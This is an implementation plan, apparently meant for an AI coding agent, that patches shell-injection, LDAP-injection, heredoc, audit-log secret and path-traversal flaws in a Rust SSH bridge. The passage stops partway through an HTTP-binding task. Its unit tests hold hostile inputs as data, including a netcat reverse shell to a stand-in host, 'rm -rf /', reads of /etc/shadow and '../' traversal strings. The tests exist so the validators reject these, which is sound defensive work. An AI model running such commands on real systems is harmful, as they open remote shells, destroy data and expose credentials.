# Security Fixes (Audit 2026-05-09) — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix the 12 confirmed security vulnerabilities (≥0.8 confidence) found by the 2026-05-09 audit, without regressing usability for the default Claude Desktop / stdio MCP deployment.

**Architecture:** Each fix is scoped to its layer. P0 (input validation, audit redaction, heredoc) live in `src/domain/use_cases/` and `src/security/`. P1 (HTTP defaults, JWT) live in `src/mcp/transport/`. Multi-session isolation (PendingRequests, elicitation flag) lives in `src/mcp/server.rs` + `src/mcp/pending_requests.rs`. Validator hardening lives in `src/security/validator.rs`.

**Tech Stack:** Rust 2024, tokio, axum 0.7, serde, serde_json, uuid, regex, jsonwebtoken (new dep), reqwest (already present).

**Test command:** `cargo test --lib` for unit tests in modules; `cargo nextest run --test <name>` for integration tests under `tests/`. WSL safety: default parallelism only — do NOT pass `-j 4` or higher.

---

## Task Order Rationale

1. **Pure-domain input validators** (Tasks 1–5) — zero blast radius, just add validation/escape functions. Can ship as one PR.
2. **Heredoc terminator + audit redaction** (Tasks 6–7) — touch domain + security; still no transport changes.
3. **Path traversal hardening** (Task 8) — touches `ports/tools.rs` and one handler.
4. **HTTP transport defaults + JWT** (Tasks 9–10) — feature-gated `http`. Ship as second PR.
5. **Multi-session isolation** (Tasks 11–12) — most invasive, refactors `McpServer`. Ship as third PR.
6. **Validator shell normalization** (Task 13) — defense-in-depth, only matters in Permissive mode.

Each task is self-contained, ends with a green test and a commit. Frequent commits.

---

## Task 1: Add `validate_protocol` to firewall builder (Vuln 7)

**Files:**
- Modify: `src/domain/use_cases/firewall.rs:160-298`
- Test: same file, `#[cfg(test)] mod tests`

- [ ] **Step 1: Write the failing test**

Add to `src/domain/use_cases/firewall.rs` inside `mod tests`:

```rust
#[test]
fn test_allow_rejects_protocol_injection() {
    let r = FirewallCommandBuilder::build_allow_command(
        None,
        "80",
        Some("tcp -j ACCEPT; nc -e /bin/sh evil 9; iptables -A INPUT -p tcp"),
        None,
    );
    assert!(r.is_err(), "must reject injection in protocol");
}

#[test]
fn test_deny_rejects_protocol_injection() {
    let r = FirewallCommandBuilder::build_deny_command(
        None,
        "80",
        Some("udp; rm -rf /"),
        None,
    );
    assert!(r.is_err());
}

#[test]
fn test_allow_accepts_known_protocols() {
    for p in ["tcp", "udp", "icmp", "icmpv6"] {
        let r = FirewallCommandBuilder::build_allow_command(Some("ufw"), "80", Some(p), None);
        assert!(r.is_ok(), "{p} should be accepted");
    }
}
```

- [ ] **Step 2: Run failing test**

Run: `cargo test --lib firewall::tests::test_allow_rejects_protocol_injection`
Expected: FAIL — `build_allow_command` currently returns `Ok` for any string.

- [ ] **Step 3: Add the validator + plumbing**

Insert at the top of the existing `validate_*` block in `src/domain/use_cases/firewall.rs` (next to `validate_port`):

```rust
fn validate_protocol(p: &str) -> Result<()> {
    matches!(p, "tcp" | "udp" | "icmp" | "icmpv6")
        .then_some(())
        .ok_or_else(|| BridgeError::CommandDenied {
            reason: format!("Invalid firewall protocol '{p}'. Allowed: tcp|udp|icmp|icmpv6"),
        })
}
```

In both `build_allow_command` and `build_deny_command`, add immediately after `validate_port(port)?;`:

```rust
if let Some(p) = protocol {
    validate_protocol(p)?;
}
```

- [ ] **Step 4: Run tests**

Run: `cargo test --lib firewall::tests`
Expected: PASS for all firewall tests.

- [ ] **Step 5: Commit**

```bash
git add src/domain/use_cases/firewall.rs
git commit -m "$(cat <<'EOF'
fix(security): validate firewall protocol against allowlist

Vuln 7 (audit 2026-05-09). protocol arg was interpolated raw into
iptables/ufw/firewall-cmd shell commands. Added validate_protocol()
restricting to {tcp, udp, icmp, icmpv6}; called from both build_allow_command
and build_deny_command.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 2: Add `unit_type` allowlist to systemd builder (Vuln 6)

**Files:**
- Modify: `src/domain/use_cases/systemd.rs:129-148`
- Test: same file, `#[cfg(test)] mod tests`

- [ ] **Step 1: Write the failing test**

Add to `src/domain/use_cases/systemd.rs` inside `mod tests`:

```rust
#[test]
fn test_list_command_rejects_injection_in_unit_type() {
    let r = SystemdCommandBuilder::build_list_command(
        None,
        false,
        Some("service; cat /etc/shadow #"),
    );
    assert!(r.is_err(), "must reject unit_type with shell metacharacters");
}

#[test]
fn test_list_command_accepts_known_unit_types() {
    for t in ["service", "socket", "timer", "mount", "target", "automount", "path", "slice", "scope", "device", "swap"] {
        let r = SystemdCommandBuilder::build_list_command(None, false, Some(t));
        assert!(r.is_ok(), "{t} should be accepted");
    }
}

#[test]
fn test_list_command_default_no_unit_type() {
    let r = SystemdCommandBuilder::build_list_command(None, false, None);
    assert!(r.is_ok());
    assert!(r.unwrap().contains("--type=service"));
}
```

- [ ] **Step 2: Run failing test**

Run: `cargo test --lib systemd::tests::test_list_command_rejects_injection_in_unit_type`
Expected: FAIL — `build_list_command` currently returns `String`, not `Result<String>`.

- [ ] **Step 3: Convert `build_list_command` to fallible + add validator**

Replace the existing function and add the validator near `build_logs_command`:

```rust
fn validate_unit_type(t: &str) -> Result<()> {
    matches!(t,
        "service" | "socket" | "timer" | "mount" | "target"
        | "automount" | "path" | "slice" | "scope" | "device" | "swap"
    )
    .then_some(())
    .ok_or_else(|| BridgeError::CommandDenied {
        reason: format!("Invalid systemd unit_type '{t}'. Allowed: service|socket|timer|mount|target|automount|path|slice|scope|device|swap"),
    })
}

#[must_use = "the returned Result must be checked; the command was not built unconditionally"]
pub fn build_list_command(
    state: Option<&str>,
    all: bool,
    unit_type: Option<&str>,
) -> Result<String> {
    let utype = unit_type.unwrap_or("service");
    validate_unit_type(utype)?;
    let mut cmd = format!("systemctl list-units --type={utype}");

    if let Some(s) = state {
        let _ = write!(cmd, " --state={}", shell_escape(s));
    }

    if all {
        cmd.push_str(" --all");
    }

    cmd.push_str(" --no-pager --no-legend");
    Ok(cmd)
}
```

Note: `Result` and `BridgeError` should already be imported in this file (used by sibling builders); if not, add `use crate::error::{BridgeError, Result};`.

- [ ] **Step 4: Update the caller**

Update `src/mcp/tool_handlers/ssh_service_list.rs`. Find the call site:

```rust
let cmd = SystemdCommandBuilder::build_list_command(
    args.state.as_deref(),
    args.all.unwrap_or(false),
    args.unit_type.as_deref(),
);
```

Add `?`:

```rust
let cmd = SystemdCommandBuilder::build_list_command(
    args.state.as_deref(),
    args.all.unwrap_or(false),
    args.unit_type.as_deref(),
)?;
```

The handler's return type is already `Result<...>` so `?` works.

- [ ] **Step 5: Run tests**

Run: `cargo test --lib systemd::tests`
Run: `cargo check`
Expected: PASS, clean check.

- [ ] **Step 6: Commit**

```bash
git add src/domain/use_cases/systemd.rs src/mcp/tool_handlers/ssh_service_list.rs
git commit -m "$(cat <<'EOF'
fix(security): allowlist systemd unit_type in list_command

Vuln 6 (audit 2026-05-09). unit_type was interpolated raw into
'systemctl list-units --type={utype}'. Converted build_list_command
to Result, added validate_unit_type() with the documented set of
unit types. Updated ssh_service_list handler to propagate the error.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 3: Validate env-var names in file_template (Vuln 5)

**Files:**
- Modify: `src/domain/use_cases/file_advanced.rs:32-60`
- Test: same file, `#[cfg(test)] mod tests`

- [ ] **Step 1: Write the failing test**

Add to `src/domain/use_cases/file_advanced.rs` inside `mod tests`:

```rust
#[test]
fn test_template_command_rejects_injected_var_name() {
    let vars = vec![
        ("FOO; bash -c 'evil' #".to_string(), "x".to_string()),
    ];
    let r = FileAdvancedCommandBuilder::build_template_command(
        "/etc/template.conf",
        "/tmp/out",
        &vars,
    );
    assert!(r.is_err(), "must reject keys with shell metacharacters");
}

#[test]
fn test_template_command_rejects_lowercase_or_digit_first() {
    for bad in ["1FOO", "foo bar", "BAD-NAME", "WITH$DOLLAR"] {
        let vars = vec![(bad.to_string(), "x".to_string())];
        let r = FileAdvancedCommandBuilder::build_template_command(
            "/etc/t",
            "/tmp/o",
            &vars,
        );
        assert!(r.is_err(), "key {bad} must be rejected");
    }
}

#[test]
fn test_template_command_accepts_posix_names() {
    for ok in ["FOO", "FOO_BAR", "_LEADING", "X1", "A_B_C_123"] {
        let vars = vec![(ok.to_string(), "x".to_string())];
        let r = FileAdvancedCommandBuilder::build_template_command(
            "/etc/t",
            "/tmp/o",
            &vars,
        );
        assert!(r.is_ok(), "key {ok} must be accepted");
    }
}
```

- [ ] **Step 2: Run failing test**

Run: `cargo test --lib file_advanced::tests::test_template_command_rejects_injected_var_name`
Expected: FAIL — function currently returns `String`.

- [ ] **Step 3: Convert to fallible + validate keys**

Replace `build_template_command` with:

```rust
fn validate_env_var_name(name: &str) -> Result<()> {
    let mut chars = name.chars();
    let first_ok = chars.next().is_some_and(|c| c.is_ascii_alphabetic() || c == '_');
    let rest_ok = chars.all(|c| c.is_ascii_alphanumeric() || c == '_');
    if first_ok && rest_ok && !name.is_empty() {
        Ok(())
    } else {
        Err(BridgeError::CommandDenied {
            reason: format!("Invalid env var name '{name}'. Must match [A-Za-z_][A-Za-z0-9_]*"),
        })
    }
}

/// Build a template rendering command using envsubst.
///
/// # Errors
///
/// Returns [`BridgeError::CommandDenied`] if a variable key is not a valid POSIX env-var name.
pub fn build_template_command(
    template_path: &str,
    output_path: &str,
    variables: &[(String, String)],
) -> Result<String> {
    let escaped_template = shell_escape(template_path);
    let escaped_output = shell_escape(output_path);

    let mut exports: Vec<String> = Vec::with_capacity(variables.len());
    for (k, v) in variables {
        validate_env_var_name(k)?;
        let escaped_v = shell_escape(v);
        exports.push(format!("export {k}={escaped_v}"));
    }

    let export_str = if exports.is_empty() {
        String::new()
    } else {
        format!("{} && ", exports.join(" && "))
    };

    Ok(format!(
        "{export_str}envsubst < {escaped_template} > {escaped_output} && echo 'Template rendered to {output_path}'"
    ))
}
```

Add to imports at the top of the file:

```rust
use crate::error::{BridgeError, Result};
```

Update the existing `test_template_command` and `test_template_command_no_vars` tests to call `.unwrap()` on the result:

```rust
let cmd = FileAdvancedCommandBuilder::build_template_command(
    "/etc/nginx/template.conf",
    "/etc/nginx/site.conf",
    &vars,
).unwrap();
```

- [ ] **Step 4: Update the caller**

Update `src/mcp/tool_handlers/ssh_file_template.rs`. Find the `build_template_command` call site and add `?`.

- [ ] **Step 5: Run tests**

Run: `cargo test --lib file_advanced::tests`
Run: `cargo check`
Expected: PASS, clean.

- [ ] **Step 6: Commit**

```bash
git add src/domain/use_cases/file_advanced.rs src/mcp/tool_handlers/ssh_file_template.rs
git commit -m "$(cat <<'EOF'
fix(security): validate env var names in file_template builder

Vuln 5 (audit 2026-05-09). Variable KEYS in HashMap<String,String>
were interpolated raw into 'export {k}={v}' shell commands while values
were correctly escaped. Added validate_env_var_name() requiring POSIX
[A-Za-z_][A-Za-z0-9_]*; converted build_template_command to Result.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 4: RFC 4515-escape LDAP filter values (Vuln 12)

**Files:**
- Modify: `src/domain/use_cases/ldap.rs:46-62`
- Test: same file

- [ ] **Step 1: Write the failing test**

Add to `src/domain/use_cases/ldap.rs` inside `mod tests`:

```rust
#[test]
fn test_user_info_escapes_filter_metacharacters() {
    let cmd = LdapCommandBuilder::build_user_info_command(
        "dc=example,dc=com",
        "*)(uid=*",
        None,
    );
    assert!(!cmd.contains("(uid=*)(uid=*"), "raw injection must not appear");
    assert!(cmd.contains(r"\2a"), "asterisk must be RFC 4515 encoded");
    assert!(cmd.contains(r"\28") || cmd.contains(r"\29"), "parens must be encoded");
}

#[test]
fn test_group_members_escapes_filter_metacharacters() {
    let cmd = LdapCommandBuilder::build_group_members_command(
        "dc=example,dc=com",
        "admins)(member=*",
        None,
    );
    assert!(!cmd.contains("(cn=admins)(member="));
    assert!(cmd.contains(r"\29")); // ')' encoded
}

#[test]
fn test_user_info_passthrough_clean_value() {
    let cmd = LdapCommandBuilder::build_user_info_command(
        "dc=example,dc=com",
        "alice",
        None,
    );
    assert!(cmd.contains("(uid=alice)") || cmd.contains("'(uid=alice)'"));
}
```

- [ ] **Step 2: Run failing test**

Run: `cargo test --lib ldap::tests::test_user_info_escapes_filter_metacharacters`
Expected: FAIL.

- [ ] **Step 3: Add the escape function and call it**

Insert at the top of `src/domain/use_cases/ldap.rs` (after the `shell_escape` helper):

```rust
/// Escape a value for inclusion inside an LDAP filter, per RFC 4515 §3.
fn ldap_filter_escape(value: &str) -> String {
    let mut out = String::with_capacity(value.len());
    for b in value.bytes() {
        match b {
            b'(' => out.push_str(r"\28"),
            b')' => out.push_str(r"\29"),
            b'*' => out.push_str(r"\2a"),
            b'\\' => out.push_str(r"\5c"),
            0 => out.push_str(r"\00"),
            _ => out.push(b as char),
        }
    }
    out
}
```

Replace the two filter-building call sites:

```rust
#[must_use]
pub fn build_user_info_command(base_dn: &str, username: &str, uri: Option<&str>) -> String {
    let filter = format!("(uid={})", ldap_filter_escape(username));
    Self::build_search_command(base_dn, Some(&filter), None, Some("sub"), uri)
}

#[must_use]
pub fn build_group_members_command(base_dn: &str, group: &str, uri: Option<&str>) -> String {
    let filter = format!("(cn={})", ldap_filter_escape(group));
    Self::build_search_command(
        base_dn,
        Some(&filter),
        Some("member memberUid"),
        Some("sub"),
        uri,
    )
}
```

- [ ] **Step 4: Run tests**

Run: `cargo test --lib ldap::tests`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/domain/use_cases/ldap.rs
git commit -m "$(cat <<'EOF'
fix(security): RFC 4515-escape values in LDAP filters

Vuln 12 (audit 2026-05-09). build_user_info_command and
build_group_members_command concatenated raw username/group strings
into LDAP filter syntax. Added ldap_filter_escape() encoding (, ), *,
\, NUL per RFC 4515 §3.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 5: Randomized heredoc terminator in template_apply (Vuln 4)

**Files:**
- Modify: `src/domain/use_cases/templates.rs:131-146`
- Test: same file
- Cargo dep check: `uuid` is already in Cargo.toml — confirm with `grep '^uuid' Cargo.toml`

- [ ] **Step 1: Write the failing test**

Add to `src/domain/use_cases/templates.rs` inside `mod tests`:

```rust
#[test]
fn test_template_apply_uses_unique_terminator() {
    let cmd = TemplateCommandBuilder::build_template_apply_command(
        "hello\nTEMPLATE_EOF\nbash -c 'evil'",
        "/etc/site.conf",
        false,
    );
    // The literal terminator chosen at build time must NOT also appear in the body.
    // We extract the terminator (the token after `<< '` and before `'\n`).
    let start = cmd.find("<< '").unwrap() + 4;
    let end = cmd[start..].find('\'').unwrap() + start;
    let terminator = &cmd[start..end];
    let body_start = cmd.find('\n').unwrap() + 1;
    let body_end = cmd.rfind(&format!("\n{terminator}")).unwrap();
    let body = &cmd[body_start..body_end];
    assert!(
        !body.lines().any(|l| l == terminator),
        "terminator {terminator} must not appear as a sole line in body"
    );
}

#[test]
fn test_template_apply_terminators_are_unique_per_call() {
    let a = TemplateCommandBuilder::build_template_apply_command("a", "/x", false);
    let b = TemplateCommandBuilder::build_template_apply_command("a", "/x", false);
    assert_ne!(a, b, "calls must use different terminators");
}
```

- [ ] **Step 2: Run failing test**

Run: `cargo test --lib templates::tests::test_template_apply_uses_unique_terminator`
Expected: FAIL — terminator is hardcoded `TEMPLATE_EOF`.

- [ ] **Step 3: Implement randomized terminator**

Replace `build_template_apply_command`:

```rust
#[must_use]
pub fn build_template_apply_command(content: &str, dest: &str, backup: bool) -> String {
    let escaped_dest = shell_escape(dest);
    let mut cmd = String::new();
    if backup {
        let _ = write!(cmd, "cp {escaped_dest} {escaped_dest}.bak 2>/dev/null; ");
    }

    // Choose a random terminator that does not appear as a sole line in the body.
    // Loop is bounded: a 32-hex-char UUID collision with content is astronomically rare,
    // but we still verify and re-roll if the (one-in-2^128) collision happens.
    let terminator = loop {
        let candidate = format!("MCP_EOF_{}", uuid::Uuid::new_v4().simple());
        if !content.lines().any(|l| l == candidate) {
            break candidate;
        }
    };

    let _ = write!(
        cmd,
        "cat > {escaped_dest} << '{terminator}'\n{content}\n{terminator}"
    );
    cmd
}
```

Add at the top of the file if not present:

```rust
use std::fmt::Write;
```

(`uuid` is already a project dep — see `Cargo.toml`.)

- [ ] **Step 4: Run tests**

Run: `cargo test --lib templates::tests`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/domain/use_cases/templates.rs
git commit -m "$(cat <<'EOF'
fix(security): randomize heredoc terminator in template_apply

Vuln 4 (audit 2026-05-09). Hardcoded 'TEMPLATE_EOF' allowed an attacker
to close the heredoc by including a sole-line 'TEMPLATE_EOF' in the
content body, then run arbitrary shell after it. Now generates
'MCP_EOF_{uuid}' per call and verifies it does not appear in the body.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 6: Sanitize `command` before audit log write (Vuln 3)

**Files:**
- Modify: `src/security/audit.rs:1-200`
- Test: new file `tests/security_audit_redaction.rs` (or extend existing `tests/security_audit.rs`)

- [ ] **Step 1: Write the failing test**

Add a new integration test file `tests/security_audit_redaction.rs`:

```rust
//! Audit-log secret redaction tests (Vuln 3 / 2026-05-09).

use mcp_ssh_bridge::config::{AuditConfig, SanitizeConfig};
use mcp_ssh_bridge::security::{AuditEvent, AuditLogger, CommandResult, Sanitizer};

#[tokio::test]
async fn audit_log_redacts_password_in_command() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("audit.log");
    let config = AuditConfig {
        enabled: true,
        path: path.clone(),
        max_size_mb: 10,
        ..AuditConfig::default()
    };
    let sanitizer = Sanitizer::from_config(&SanitizeConfig::default());
    let (logger, task) = AuditLogger::new_with_sanitizer(&config, sanitizer).unwrap();
    let writer = tokio::spawn(task.unwrap().run());

    logger.log(AuditEvent::new(
        "prod-db",
        "MYSQL_PWD='hunter2-supersecret-do-not-leak' mysql -e 'SELECT 1'",
        CommandResult::Success { exit_code: 0, duration_ms: 12 },
    ));

    // Drop sender so the writer task exits.
    drop(logger);
    writer.await.unwrap();

    let contents = std::fs::read_to_string(&path).unwrap();
    assert!(
        !contents.contains("hunter2-supersecret-do-not-leak"),
        "password leaked into audit log:\n{contents}"
    );
    assert!(contents.contains("[PASSWORD_REDACTED]") || contents.contains("REDACTED"));
}

#[tokio::test]
async fn audit_log_redacts_bearer_token() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("audit.log");
    let config = AuditConfig {
        enabled: true,
        path: path.clone(),
        max_size_mb: 10,
        ..AuditConfig::default()
    };
    let sanitizer = Sanitizer::from_config(&SanitizeConfig::default());
    let (logger, task) = AuditLogger::new_with_sanitizer(&config, sanitizer).unwrap();
    let writer = tokio::spawn(task.unwrap().run());

    logger.log(AuditEvent::new(
        "awx",
        "curl -H 'Authorization: Bearer abc123def456ghi789jkl012mno345' https://awx/api",
        CommandResult::Success { exit_code: 0, duration_ms: 5 },
    ));
    drop(logger);
    writer.await.unwrap();

    let contents = std::fs::read_to_string(&path).unwrap();
    assert!(!contents.contains("abc123def456ghi789jkl012mno345"));
}
```

Note: `Sanitizer` and `AuditLogger` must be re-exported from `lib.rs`. Check with `grep -n "pub use" src/lib.rs`. If not exported, add: `pub use crate::security::{AuditEvent, AuditLogger, CommandResult, Sanitizer};`.

- [ ] **Step 2: Run failing test**

Run: `cargo test --test security_audit_redaction`
Expected: FAIL — `AuditLogger::new_with_sanitizer` does not exist.

- [ ] **Step 3: Implement sanitization in audit writer**

Modify `src/security/audit.rs`:

a) Add an optional sanitizer field to `AuditWriterTask`:

```rust
pub struct AuditWriterTask {
    rx: mpsc::UnboundedReceiver<AuditEvent>,
    file: File,
    sanitizer: Option<Arc<crate::security::Sanitizer>>,
}
```

b) Add `Arc` import: `use std::sync::Arc;`

c) Add a constructor that wires the sanitizer:

```rust
impl AuditLogger {
    /// Create an async audit logger that redacts secrets from `command`
    /// before serializing each event.
    ///
    /// # Errors
    ///
    /// Returns an error if the audit log file cannot be created or opened.
    pub fn new_with_sanitizer(
        config: &AuditConfig,
        sanitizer: crate::security::Sanitizer,
    ) -> std::io::Result<(Self, Option<AuditWriterTask>)> {
        let (logger, task) = Self::new(config)?;
        let task = task.map(|mut t| {
            t.sanitizer = Some(Arc::new(sanitizer));
            t
        });
        Ok((logger, task))
    }
}
```

d) In `AuditLogger::new`, change the `let task = AuditWriterTask { rx, file };` line to:

```rust
let task = AuditWriterTask { rx, file, sanitizer: None };
```

e) Set permissions on the audit file at creation. Replace the `OpenOptions::new()...open(&config.path)?;` block with:

```rust
let file = {
    let mut opts = OpenOptions::new();
    opts.create(true).append(true);
    #[cfg(unix)]
    {
        use std::os::unix::fs::OpenOptionsExt;
        opts.mode(0o600);
    }
    opts.open(&config.path)?
};
```

f) Update `AuditWriterTask::run` to apply the sanitizer:

```rust
pub async fn run(mut self) {
    while let Some(mut event) = self.rx.recv().await {
        if let Some(ref s) = self.sanitizer {
            event.command = s.sanitize(&event.command).into_owned();
        }
        if let Ok(json) = serde_json::to_string(&event) {
            let line = format!("{json}\n");
            if let Ok(mut file) = self.file.try_clone() {
                let _ = tokio::task::spawn_blocking(move || {
                    if let Err(e) = file.write_all(line.as_bytes()) {
                        warn!(error = %e, "Failed to write audit event to file");
                    }
                    if let Err(e) = file.flush() {
                        warn!(error = %e, "Failed to flush audit log file");
                    }
                })
                .await;
            }
        }
    }
}
```

g) Apply the same sanitization to the tracing emission. Modify `AuditLogger::log`:

```rust
pub fn log(&self, event: AuditEvent) {
    let mut event = event;
    if let Some(ref s) = self.sanitizer {
        event.command = s.sanitize(&event.command).into_owned();
    }
    Self::log_to_tracing(&event);
    if let Some(ref sender) = self.sender {
        let _ = sender.send(event);
    }
}
```

h) Add the `sanitizer: Option<Arc<...>>` field on `AuditLogger` and propagate it from both constructors:

```rust
pub struct AuditLogger {
    config: AuditConfig,
    sender: Option<mpsc::UnboundedSender<AuditEvent>>,
    sanitizer: Option<Arc<crate::security::Sanitizer>>,
}
```

Initialize it as `sanitizer: None` in `new()` and `disabled()`, and in `new_with_sanitizer` set both `logger.sanitizer` and the task's `sanitizer` to the same `Arc`.

i) Wire `new_with_sanitizer` from `McpServer::new`. Find the existing `AuditLogger::new(&config.audit)` call in `src/mcp/server.rs` and replace with:

```rust
let sanitizer_for_audit = Sanitizer::from_config(&config.security.sanitize);
let (audit_logger, audit_task) =
    AuditLogger::new_with_sanitizer(&config.audit, sanitizer_for_audit)
        .unwrap_or_else(|_| (AuditLogger::disabled(), None));
```

(Use the same fallback pattern that the file already uses for the existing `AuditLogger::new`.)

- [ ] **Step 4: Run tests**

Run: `cargo test --test security_audit_redaction`
Run: `cargo test --lib`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add src/security/audit.rs src/mcp/server.rs src/lib.rs tests/security_audit_redaction.rs
git commit -m "$(cat <<'EOF'
fix(security): sanitize commands before audit log write

Vuln 3 (audit 2026-05-09). Audit log was emitting MYSQL_PWD,
PGPASSWORD, Bearer tokens, and webhook URL secrets in plaintext
to both the JSONL file and tracing sinks. Added new_with_sanitizer
constructor on AuditLogger; runs Sanitizer::sanitize over event.command
before file write and tracing emission. Audit log file now opens with
mode 0o600 on Unix.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 7: Canonicalize paths in `validate_root_scope` + scope `ssh_file_read` (Vuln 11)

**Files:**
- Modify: `src/ports/tools.rs:308-324`
- Modify: `src/mcp/tool_handlers/ssh_file_read.rs`
- Test: `src/ports/tools.rs` `#[cfg(test)] mod tests`

- [ ] **Step 1: Write the failing tests**

Add inside `src/ports/tools.rs` `mod tests` (use the existing `create_test_context_with_*` factories):

```rust
#[test]
fn validate_root_scope_rejects_parent_traversal() {
    let mut ctx = create_test_context();
    ctx.roots = vec![crate::mcp::protocol::RootEntry {
        uri: "file:///srv/app".to_string(),
        name: None,
    }];
    assert!(ctx.validate_root_scope("/srv/app/../../etc/shadow").is_err());
    assert!(ctx.validate_root_scope("/srv/app/foo/../../../etc/passwd").is_err());
}

#[test]
fn validate_root_scope_accepts_clean_descendant() {
    let mut ctx = create_test_context();
    ctx.roots = vec![crate::mcp::protocol::RootEntry {
        uri: "file:///srv/app".to_string(),
        name: None,
    }];
    assert!(ctx.validate_root_scope("/srv/app/data/foo.txt").is_ok());
    assert!(ctx.validate_root_scope("/srv/app/data/./foo.txt").is_ok());
}

#[test]
fn validate_root_scope_no_roots_still_passes() {
    // Backward compat: legacy MCP clients with no roots must still work.
    let ctx = create_test_context();
    assert!(ctx.validate_root_scope("/anywhere").is_ok());
}
```

- [ ] **Step 2: Run failing tests**

Run: `cargo test --lib ports::tools::tests::validate_root_scope_rejects_parent_traversal`
Expected: FAIL — current impl uses `path.starts_with(&format!("{root}/"))` without normalization.

- [ ] **Step 3: Replace `validate_root_scope` with a normalizing implementation**

Replace the function in `src/ports/tools.rs`:

```rust
pub fn validate_root_scope(&self, path: &str) -> Result<()> {
    if self.roots.is_empty() {
        return Ok(());
    }

    // Lexically normalize the input path (collapse ., .., empty components).
    // We don't touch the FS — the path lives on a remote host.
    let normalized = normalize_path_lexical(path);

    for root in &self.roots {
        let root_path = root.uri.strip_prefix("file://").unwrap_or(&root.uri);
        let root_norm = normalize_path_lexical(root_path);
        if root_norm == "/" || normalized == root_norm
            || normalized.starts_with(&format!("{root_norm}/"))
        {
            return Ok(());
        }
    }
    Err(crate::error::BridgeError::McpInvalidRequest(format!(
        "Path '{path}' is outside declared workspace roots"
    )))
}
```

Add the helper at file scope (e.g. just above the impl block):

```rust
/// Lexically normalize a POSIX-style absolute path: collapse `.`, `..`, and
/// repeated `/` without touching the filesystem. Keeps the path absolute.
fn normalize_path_lexical(path: &str) -> String {
    let mut stack: Vec<&str> = Vec::new();
    for seg in path.split('/') {
        match seg {
            "" | "." => {} // empty (leading/trailing/double slash) or current
            ".." => {
                stack.pop();
            }
            other => stack.push(other),
        }
    }
    if stack.is_empty() {
        "/".to_string()
    } else {
        format!("/{}", stack.join("/"))
    }
}
```

- [ ] **Step 4: Wire `validate_root_scope` into `ssh_file_read`**

Open `src/mcp/tool_handlers/ssh_file_read.rs`. Find where the path is read from args (typically `args.path`) and add a call to `ctx.validate_root_scope(&args.path)?;` before the command builder runs. Pattern matches sibling handlers (`ssh_file_write`, `ssh_ls`).

- [ ] **Step 5: Run tests**

Run: `cargo test --lib ports::tools::tests`
Run: `cargo test --lib`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add src/ports/tools.rs src/mcp/tool_handlers/ssh_file_read.rs
git commit -m "$(cat <<'EOF'
fix(security): canonicalize paths in validate_root_scope; scope ssh_file_read

Vuln 11 (audit 2026-05-09). validate_root_scope did a string prefix
match without resolving '..', so '/declared-root/../../etc/shadow' passed.
Added normalize_path_lexical() that collapses '.', '..', and empty
components before the prefix check. Wired the check into ssh_file_read,
which previously skipped root scoping entirely.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>
EOF
)"
```

---

## Task 8: HTTP transport — loopback default + reject anonymous public bind (Vuln 1)

**Files:**
- Modify: `src/mcp/transport/http.rs:84-95, 115-137`
- Modify: `src/config/types.rs` (default_http_bind)
- Test: `src/mcp/transport/http.rs` `#[cfg(test)] mod tests`

- [ ] **Step 1: Write the failing tests**

Add to `src/mcp/transport/http.rs` inside `mod tests`:

```rust
#[test]
fn default_bind_is_loopback() {
    let cfg = HttpTransportConfig::default();
    assert_eq!(cfg.bind, "127.0.0.1:3000");
}

#[tokio::test]
async fn serve_refuses_public_bind_without_oauth() {
    let cfg = HttpTransportConfig {
        bind: "0.0.0.0:0".to_string(),
        ..Default::default()
    };
    // OAuth is disabled by default; serve must refuse.
    let server = std::sync::Arc::new(crate::mcp::McpServer::new_for_test());
    let r = serve(server, cfg).await;
    assert!(r.is_err(), "must refuse 0.0.0.0 bind without OAuth");
    let msg = format!("{}", r.err().unwrap());
    assert!(msg.contains("loopback") || msg.contains("OAuth"));
}

#[tokio::test]
async fn origin_guard_rejects_request_with_no_origin() {
    use axum::http::{Request, StatusCode};
    let cfg = HttpTransportConfig::default();
    let server = std::sync::Arc::new(crate::mcp::McpServer::new_for_test());
    let app = build_router(server, cfg);
    let response = tower::ServiceExt::oneshot(
        app,
        Request::post("/mcp").body(axum::body::Body::from(r#"{}"#)).unwrap(),
    )
    .await
    .unwrap();
    assert_eq!(response.status(), StatusCode::FORBIDDEN);
}
```

If `McpServer::new_for_test` does not exist, add it as a small `#[cfg(test)]` constructor in `src/mcp/server.rs` that returns a server built with `Config::default()`.

- [ ] **Step 2: Run failing tests**

Run: `cargo test --lib --features http transport::http::tests::default_bind_is_loopback`
Expected: FAIL — current default is `0.0.0.0:3000`.

- [ ] **Step 3: Change defaults**

In `src/mcp/transport/http.rs`:

```rust
impl Default for HttpTransportConfig {
    fn default() -> Self {
        Self {
            bind: "127.0.0.1:3000".to_string(),
            max_body_size: 1_048_576,
            session_timeout: Duration::from_secs(1800),
            max_sessions: 100,
            oauth: OAuthConfig::default(),
            allowed_origins: default_allowed_origins(),
        }
    }
}
```

In `src/config/types.rs`, find `default_http_bind` and update to `"127.0.0.1:3000".to_string()`.

- [ ] **Step 4: Add a guard in `serve()`**

Replace `serve()` in `src/mcp/transport/http.rs`:

```rust
pub async fn serve(
    server: Arc<McpServer>,
    config: HttpTransportConfig,
) -> crate::error::Result<()> {
    refuse_unsafe_bind(&config)?;

    let bind = config.bind.clone();
    let router = build_router(server, config);

    info!(bind = %bind, "Starting MCP HTTP transport");

    let listener = tokio::net::TcpListener::bind(&bind).await?;
    axum::serve(listener, router)
        .await
